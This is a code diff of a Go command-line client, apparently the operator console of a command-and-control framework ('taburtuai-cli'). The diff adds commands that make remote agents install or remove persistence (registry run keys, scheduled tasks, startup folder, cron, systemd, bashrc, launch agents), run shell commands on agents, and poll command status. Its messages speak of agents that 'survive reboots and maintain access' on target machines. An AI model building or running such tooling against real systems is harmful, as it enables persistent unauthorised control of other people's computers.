+		endpoint := fmt.Sprintf("/api/v1/agent/%s/persistence/setup", agentID)
+		serverRespBytes, err := makeAPIRequestWithMethod("POST", endpoint, bytes.NewBuffer(jsonPayload), "application/json")
+		if err != nil {
+			printError(fmt.Sprintf("Failed to send persistence setup request: %v", err))
+			os.Exit(1)
+		}
+
+		if verbose {
+			printVerbose(fmt.Sprintf("Persistence setup response: %s", string(serverRespBytes)))
+		}
+
+		var apiResp APIResponse
+		if err := json.Unmarshal(serverRespBytes, &apiResp); err != nil {
+			printError(fmt.Sprintf("Failed to parse persistence setup response: %v. Raw: %s", err, string(serverRespBytes)))
+			os.Exit(1)
+		}
+
+		if !apiResp.Success {
+			printError(fmt.Sprintf("Server error during persistence setup: %s", apiResp.Error))
+			os.Exit(1)
+		}
+
+		// Extract command_id using helper function
+		commandID, err := extractCommandID(apiResp, "persistence_setup")
+		if err != nil {
+			printError(fmt.Sprintf("Failed to extract command_id from persistence setup response: %v", err))
+			os.Exit(1)
+		}
+
+		// Get persist_name from response if generated by server
+		var persistName string
+		if apiResp.Data != nil {
+			if dataMap, ok := apiResp.Data.(map[string]interface{}); ok {
+				if result, hasResult := dataMap["result"].(map[string]interface{}); hasResult {
+					if genName, hasName := result["persist_name"].(string); hasName {
+						persistName = genName
+					}
+				} else if genName, hasName := dataMap["persist_name"].(string); hasName {
+					persistName = genName
+				}
+			}
+		}
+
+		printSuccess(fmt.Sprintf("Persistence setup command queued. Command ID: %s", commandID))
+		if persistName != "" && persistName != name {
+			printInfo(fmt.Sprintf("Generated persistence name: %s", persistName))
+		}
+
+		if wait {
+			printInfo("Waiting for persistence setup to complete...")
+			finalStatusData := waitForCommand(commandID, 120) // 2 minutes timeout
+			if finalStatusData != nil {
+				if statusMap, ok := finalStatusData.(map[string]interface{}); ok {
+					status := getStringFromMap(statusMap, "status")
+					output := getStringFromMap(statusMap, "output")
+					errorMsg := getStringFromMap(statusMap, "error")
+
+					if status == "completed" {
+						if output != "" {
+							printSuccess(fmt.Sprintf("Persistence setup completed: %s", output))
+						} else {
+							printSuccess(fmt.Sprintf("Persistence '%s' using method '%s' setup successfully", name, method))
+						}
+						printInfo("Agent should now survive reboots and maintain access.")
+					} else if status == "failed" {
+						if errorMsg != "" {
+							printError(fmt.Sprintf("Persistence setup failed: %s", errorMsg))
+						} else {
+							printError(fmt.Sprintf("Failed to setup persistence '%s'", name))
+						}
+					}
+				}
+			}
+		} else {
+			printInfo(fmt.Sprintf("Check status with: taburtuai-cli status %s", commandID))
+			printInfo("Test persistence by rebooting the target machine and checking if agent reconnects.")
+		}
+	},
+}
+
+var persistenceRemoveCmd = &cobra.Command{
+	Use:   "remove <agent-id>",
+	Short: "Remove persistence mechanism from agent",
+	Long:  "Remove previously setup persistence mechanism from the specified agent",
+	Args:  cobra.ExactArgs(1),
+	Run: func(cmd *cobra.Command, args []string) {
+		agentID := args[0]
+
+		method, _ := cmd.Flags().GetString("method")
+		name, _ := cmd.Flags().GetString("name")
+		wait, _ := cmd.Flags().GetBool("wait")
+
+		if method == "" {
+			printError("--method is required (same method used during setup)")
+			os.Exit(1)
+		}
+
+		if name == "" {
+			printError("--name is required (same name used during setup)")
+			os.Exit(1)
+		}
+
+		printInfo(fmt.Sprintf("Removing %s persistence '%s' from agent %s...", method, name, agentID))
+
+		payload := map[string]interface{}{
+			"persist_method": method,
+			"persist_name":   name,
+		}
+
+		jsonPayload, err := json.Marshal(payload)
+		if err != nil {
+			printError(fmt.Sprintf("Failed to marshal persistence remove payload: %v", err))
+			os.Exit(1)
+		}
+
+		endpoint := fmt.Sprintf("/api/v1/agent/%s/persistence/remove", agentID)
+		serverRespBytes, err := makeAPIRequestWithMethod("POST", endpoint, bytes.NewBuffer(jsonPayload), "application/json")
+		if err != nil {
+			printError(fmt.Sprintf("Failed to send persistence remove request: %v", err))
+			os.Exit(1)
+		}
+
+		if verbose {
+			printVerbose(fmt.Sprintf("Persistence remove response: %s", string(serverRespBytes)))
+		}
+
+		var apiResp APIResponse
+		if err := json.Unmarshal(serverRespBytes, &apiResp); err != nil {
+			printError(fmt.Sprintf("Failed to parse persistence remove response: %v. Raw: %s", err, string(serverRespBytes)))
+			os.Exit(1)
+		}
+
+		if !apiResp.Success {
+			printError(fmt.Sprintf("Server error during persistence removal: %s", apiResp.Error))
+			os.Exit(1)
+		}
+
+		// Extract command_id using helper function
+		commandID, err := extractCommandID(apiResp, "persistence_remove")
+		if err != nil {
+			printError(fmt.Sprintf("Failed to extract command_id from persistence remove response: %v", err))
+			os.Exit(1)
+		}
+
+		printSuccess(fmt.Sprintf("Persistence removal command queued. Command ID: %s", commandID))
+
+		if wait {
+			printInfo("Waiting for persistence removal to complete...")
+			finalStatusData := waitForCommand(commandID, 120) // 2 minutes timeout
+			if finalStatusData != nil {
+				if statusMap, ok := finalStatusData.(map[string]interface{}); ok {
+					status := getStringFromMap(statusMap, "status")
+					output := getStringFromMap(statusMap, "output")
+					errorMsg := getStringFromMap(statusMap, "error")
+
+					if status == "completed" {
+						if output != "" {
+							printSuccess(fmt.Sprintf("Persistence removal completed: %s", output))
+						} else {
+							printSuccess(fmt.Sprintf("Persistence '%s' using method '%s' removed successfully", name, method))
+						}
+						printInfo("Agent persistence has been cleaned up.")
+					} else if status == "failed" {
+						if errorMsg != "" {
+							printError(fmt.Sprintf("Persistence removal failed: %s", errorMsg))
+						} else {
+							printError(fmt.Sprintf("Failed to remove persistence '%s'", name))
+						}
+					}
+				}
+			}
+		} else {
+			printInfo(fmt.Sprintf("Check status with: taburtuai-cli status %s", commandID))
 		}
 	},
 }
@@ -1087,7 +1627,7 @@ func executeShellCommand(agentID, commandStr string) {
 	reqBody := map[string]interface{}{
 		"agent_id": agentID,
 		"command":  commandStr,
-		"timeout":  60, // Timeout untuk perintah shell
+		"timeout":  60,
 	}
 	reqJSON, _ := json.Marshal(reqBody)
 	serverRespBytes, err := makeAPIRequestWithMethod("POST", "/api/v1/command", bytes.NewBuffer(reqJSON), "application/json")
@@ -1095,32 +1635,38 @@ func executeShellCommand(agentID, commandStr string) {
 		fmt.Printf("%sError sending shell command: %v%s\n", ColorRed, err, ColorReset)
 		return
 	}
+
+	if verbose {
+		printVerbose(fmt.Sprintf("Shell command response: %s", string(serverRespBytes)))
+	}
+
 	var apiResp APIResponse
 	if err := json.Unmarshal(serverRespBytes, &apiResp); err != nil {
 		fmt.Printf("%sError parsing shell command response: %v%s\n", ColorRed, err, ColorReset)
 		return
 	}
+
 	if !apiResp.Success {
 		fmt.Printf("%sError from server: %s%s\n", ColorRed, apiResp.Error, ColorReset)
 		return
 	}
-	dataMap, _ := apiResp.Data.(map[string]interface{})
-	commandID, _ := dataMap["command_id"].(string)
-	if commandID == "" {
-		fmt.Printf("%sServer did not return command ID for shell command.%s\n", ColorRed, ColorReset)
+
+	// Use helper function for command ID extraction
+	commandID, err := extractCommandID(apiResp, "shell")
+	if err != nil {
+		fmt.Printf("%sFailed to extract command_id: %v%s\n", ColorRed, err, ColorReset)
 		return
 	}
-	// Tunggu dan tampilkan output secara real-time (lebih kompleks) atau tunggu selesai
-	// Untuk kesederhanaan, tunggu selesai dan tampilkan semua.
-	finalStatusData := waitForCommand(commandID, 60) // Tunggu 60 detik
+
+	finalStatusData := waitForCommand(commandID, 60)
 	if finalStatusData != nil {
 		if statusMap, ok := finalStatusData.(map[string]interface{}); ok {
 			output, _ := statusMap["output"].(string)
 			errorMsg, _ := statusMap["error"].(string)
 			if output != "" {
-				fmt.Print(output) // Print langsung, mungkin sudah ada newline
+				fmt.Print(output)
 				if !strings.HasSuffix(output, "\n") {
-					fmt.Println() // Tambah newline jika belum ada
+					fmt.Println()
 				}
 			}
 			if errorMsg != "" {
@@ -1134,67 +1680,104 @@ func waitForCommand(commandID string, timeoutSeconds int) interface{} {
 	spinner := []string{"⠋", "⠙", "⠹", "⠸", "⠼", "⠴", "⠦", "⠧", "⠇", "⠏"}
 	spinIdx := 0
 	startTime := time.Now()
-	// Jika timeoutSeconds adalah 0 dari flag, gunakan default yang lebih tinggi
 	if timeoutSeconds == 0 {
-		timeoutSeconds = 300 // Default 5 menit jika tidak diset
+		timeoutSeconds = 300
 	}
 	maxDuration := time.Duration(timeoutSeconds) * time.Second
+
+	// Start with longer intervals to avoid rate limiting
+	pollInterval := 2 * time.Second
+	consecutiveErrors := 0
 
 	for time.Since(startTime) < maxDuration {
 		statusRespBytes, err := makeAPIRequest(fmt.Sprintf("/api/v1/command/%s/status", commandID))
 		if err != nil {
-			fmt.Printf("\r%s Error checking status: %v. Retrying... %s\n", ColorRed, err, ColorReset)
-			time.Sleep(2 * time.Second)
+			consecutiveErrors++
+			// If rate limited, increase wait time exponentially
+			if strings.Contains(err.Error(), "429") || strings.Contains(err.Error(), "Rate limit") {
+				waitTime := time.Duration(consecutiveErrors) * 5 * time.Second
+				if waitTime > 30*time.Second {
+					waitTime = 30 * time.Second
+				}
+				fmt.Printf("\r%s Rate limited. Waiting %v before retry... %s", ColorYellow, waitTime, ColorReset)
+				time.Sleep(waitTime)
+				continue
+			}
+
+			fmt.Printf("\r%s Error checking status: %v. Retrying in %v... %s\n", ColorRed, err, pollInterval, ColorReset)
+			time.Sleep(pollInterval)
+			// Increase poll interval on errors
+			if pollInterval < 10*time.Second {
+				pollInterval += time.Second
+			}
 			continue
 		}
+
+		// Reset error counter and poll interval on success
+		consecutiveErrors = 0
+		pollInterval = 2 * time.Second
+
 		var statusAPIResp APIResponse
 		if err := json.Unmarshal(statusRespBytes, &statusAPIResp); err != nil {
-			fmt.Printf("\r%s Error parsing status response. Retrying... %s\n", ColorRed, ColorReset)
-			time.Sleep(1 * time.Second)
+			fmt.Printf("\r%s Error parsing status response. Retrying in %v... %s\n", ColorRed, pollInterval, ColorReset)
+			time.Sleep(pollInterval)
 			continue
 		}
+
 		if !statusAPIResp.Success {
 			if strings.Contains(statusAPIResp.Error, "Command not found") {
 				fmt.Printf("\r%s Command %s not found. %s\n", ColorRed, commandID, ColorReset)
 				return nil
 			}
-			fmt.Printf("\r%s Server error on status: %s. Retrying... %s\n", ColorRed, statusAPIResp.Error, ColorReset)
-			time.Sleep(2 * time.Second)
+			fmt.Printf("\r%s Server error on status: %s. Retrying in %v... %s\n", ColorRed, statusAPIResp.Error, pollInterval, ColorReset)
+			time.Sleep(pollInterval)
 			continue
 		}
+
 		if statusAPIResp.Data == nil {
-			fmt.Printf("\r%s No data in status. Retrying... %s", ColorYellow, ColorReset)
-			time.Sleep(1 * time.Second)
+			fmt.Printf("\r%s No data in status. Retrying in %v... %s", ColorYellow, pollInterval, ColorReset)
+			time.Sleep(pollInterval)
 			continue
 		}
-		cmdData, ok := statusAPIResp.Data.(map[string]interface{})
-		if !ok {
-			fmt.Printf("\r%s Invalid data format in status. Retrying... %s", ColorYellow, ColorReset)
-			time.Sleep(1 * time.Second)
+
+		// Handle nested response structure for status
+		var cmdData map[string]interface{}
+		if dataMap, ok := statusAPIResp.Data.(map[string]interface{}); ok {
+			// Check for nested result structure first
+			if result, hasResult := dataMap["result"].(map[string]interface{}); hasResult {
+				cmdData = result
+				if verbose {
+					printVerbose("Found command status in nested result structure")
+				}
+			} else {
+				// Use direct structure as fallback
+				cmdData = dataMap
+				if verbose {
+					printVerbose("Found command status in direct structure")
+				}
+			}
+		} else {
+			fmt.Printf("\r%s Invalid data format in status. Retrying in %v... %s", ColorYellow, pollInterval, ColorReset)
+			time.Sleep(pollInterval)
 			continue
 		}
+
 		status, _ := cmdData["status"].(string)
 		fmt.Printf("\r%s Status: %s %s %s", ColorCyan, status, spinner[spinIdx], ColorReset)
 		spinIdx = (spinIdx + 1) % len(spinner)
+
 		switch status {
 		case "completed", "failed", "timeout":
 			fmt.Printf("\r%s Status: %s. Finalizing...                %s\n", ColorGreen, status, ColorReset)
 			displayFinalCommandStatus(cmdData, commandID)
 			return cmdData
 		}
-		time.Sleep(500 * time.Millisecond)
+
+		// Wait before next poll
+		time.Sleep(pollInterval)
 	}
+
 	fmt.Printf("\r%s Timed out waiting for command %s after %d seconds. %s\n", ColorRed, commandID, timeoutSeconds, ColorReset)
-	statusRespBytes, err := makeAPIRequest(fmt.Sprintf("/api/v1/command/%s/status", commandID))
-	if err == nil {
-		var statusAPIResp APIResponse
-		if json.Unmarshal(statusRespBytes, &statusAPIResp) == nil && statusAPIResp.Success {
-			if cmdData, ok := statusAPIResp.Data.(map[string]interface{}); ok {
-				displayFinalCommandStatus(cmdData, commandID)
-				return cmdData
-			}
-		}
-	}
 	return nil
 }
 
@@ -1246,6 +1829,66 @@ func printVerbose(msg string) {
 	if verbose {
 		fmt.Printf("%s[DEBUG]%s %s\n", ColorPurple, ColorReset, msg)
 	}
+}
+
+func extractCommandID(apiResp APIResponse, operation string) (string, error) {
+	if verbose {
+		printVerbose(fmt.Sprintf("Extracting command_id from %s response", operation))
+		printVerbose(fmt.Sprintf("Response success: %v", apiResp.Success))
+		printVerbose(fmt.Sprintf("Response data type: %T", apiResp.Data))
+		if apiResp.Data != nil {
+			printVerbose(fmt.Sprintf("Response data content: %+v", apiResp.Data))
+		}
+	}
+
+	if apiResp.Data == nil {
+		return "", fmt.Errorf("no data in response")
+	}
+
+	dataMap, ok := apiResp.Data.(map[string]interface{})
+	if !ok {
+		return "", fmt.Errorf("data is not a map, got %T", apiResp.Data)
+	}
+
+	// Try direct structure first
+	if cmdID, hasCmdID := dataMap["command_id"].(string); hasCmdID {
+		if verbose {
+			printVerbose(fmt.Sprintf("Found command_id in direct structure: %s", cmdID))
+		}
+		return cmdID, nil
+	}
+
+	// Try nested result structure
+	if result, hasResult := dataMap["result"].(map[string]interface{}); hasResult {
+		if cmdID, hasCmdID := result["command_id"].(string); hasCmdID {
+			if verbose {
+				printVerbose(fmt.Sprintf("Found command_id in nested result structure: %s", cmdID))
+			}
+			return cmdID, nil
+		}
+	}
+
+	// Debug: show available keys
+	if verbose {
+		keys := make([]string, 0, len(dataMap))
+		for k := range dataMap {
+			keys = append(keys, k)
+		}
+		printVerbose(fmt.Sprintf("Available keys in data: %v", keys))
+
+		// Check if there's a nested structure we missed
+		for k, v := range dataMap {
+			if nestedMap, isMap := v.(map[string]interface{}); isMap {
+				nestedKeys := make([]string, 0, len(nestedMap))
+				for nk := range nestedMap {
+					nestedKeys = append(nestedKeys, nk)
+				}
+				printVerbose(fmt.Sprintf("Nested keys in '%s': %v", k, nestedKeys))
+			}
+		}
+	}
+
+	return "", fmt.Errorf("command_id not found in response data structure")
 }
 
 // Initialize commands
@@ -1300,6 +1943,8 @@ func init() {
 	historyCmd.Flags().StringP("status", "", "", "Filter by status (completed, failed, etc)")
 
 	logsCmd.Flags().IntP("limit", "l", 100, "Number of log entries to show (server uses 'count')")
+	logsCmd.Flags().StringP("level", "", "", "Filter by log level (INFO, WARN, ERROR, DEBUG)")
+	logsCmd.Flags().StringP("category", "", "", "Filter by category (SYSTEM, COMMAND_EXEC, AUDIT, etc)")
 
 	filesUploadCmd.Flags().Bool("wait", false, "Wait for the upload to complete on the agent")
 	filesDownloadCmd.Flags().Bool("wait", false, "Wait for the download to complete on server")
@@ -1315,6 +1960,25 @@ func init() {
 
 	processStartCmd.Flags().StringP("args", "a", "", "Arguments for the process to start")
 	processStartCmd.Flags().Bool("wait", false, "Wait for the start confirmation")
+
+	// Persistence setup flags
+	persistenceSetupCmd.Flags().String("method", "", "Persistence method (registry_run, schtasks_onlogon, schtasks_daily, startup_folder, cron_reboot, systemd_user, bashrc, launchagent)")
+	persistenceSetupCmd.Flags().String("name", "", "Name for persistence entry (auto-generated if not specified)")
+	persistenceSetupCmd.Flags().String("path", "", "Path to executable for persistence (required)")
+	persistenceSetupCmd.Flags().String("args", "", "Arguments for the executable")
+	persistenceSetupCmd.Flags().Bool("wait", false, "Wait for persistence setup to complete")
+
+	// Persistence remove flags
+	persistenceRemoveCmd.Flags().String("method", "", "Persistence method used during setup (required)")
+	persistenceRemoveCmd.Flags().String("name", "", "Name of persistence entry to remove (required)")
+	persistenceRemoveCmd.Flags().Bool("wait", false, "Wait for persistence removal to complete")
+
+	// Add subcommands
+	persistenceCmd.AddCommand(persistenceSetupCmd)
+	persistenceCmd.AddCommand(persistenceRemoveCmd)
+
+	// Add to root command
+	rootCmd.AddCommand(persistenceCmd)
 }
 
 func main() {
